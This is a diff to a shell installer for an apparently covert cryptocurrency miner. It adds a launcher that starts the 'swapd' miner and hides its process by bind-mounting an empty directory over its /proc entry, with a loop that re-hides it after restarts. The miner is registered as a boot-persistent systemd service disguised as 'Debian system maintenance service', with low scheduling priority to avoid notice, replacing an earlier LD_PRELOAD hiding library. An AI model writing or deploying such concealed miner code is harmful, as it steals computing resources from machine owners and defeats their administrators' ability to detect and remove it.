@@ -1151,21 +1151,49 @@ else
         
         rm -rf /etc/systemd/system/swapd.service
 
+cat << 'EOF' > /root/.swapd/launcher.sh
+#!/bin/bash
+MASK_DIR="/root/.swapd/.mask"
+mkdir -p "$MASK_DIR"
+
+# 1. Start the miner in the background
+/root/.swapd/swapd --config=/root/.swapd/config.json &
+MINER_PID=$!
+
+# 2. Hide it IMMEDIATELY (before it even fully initializes)
+mount --bind "$MASK_DIR" "/proc/$MINER_PID"
+
+echo "Miner started with PID $MINER_PID and hidden instantly."
+
+# 3. Keep the hider loop running in case the miner restarts
+while true; do
+    CURRENT_PID=$(pidof swapd)
+    if [ -n "$CURRENT_PID" ]; then
+        if ! mountpoint -q "/proc/$CURRENT_PID"; then
+            mount --bind "$MASK_DIR" "/proc/$CURRENT_PID"
+        fi
+    fi
+    sleep 2
+done
+EOF
+
+chmod +x /root/.swapd/launcher.sh
+
         cat >/tmp/swapd.service <<EOL
 [Unit]
 Description=Debian system maintenance service
 After=network.target
 
 [Service]
-ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
+# Run the launcher instead of the miner directly
+ExecStart=/root/.swapd/launcher.sh
 Restart=always
-# Lower the priority so it doesn't lag the terminal
 Nice=19
 CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
-# Limit memory so it never triggers an Out-Of-Memory crash
 MemoryMax=2G
-Environment="LD_PRELOAD=/usr/local/lib/libhide.so"
+# Ensure we unmount everything if we stop the service
+ExecStopPost=/usr/bin/umount -a -t tmpfs,ramfs 2>/dev/null
 
 [Install]
 WantedBy=multi-user.target
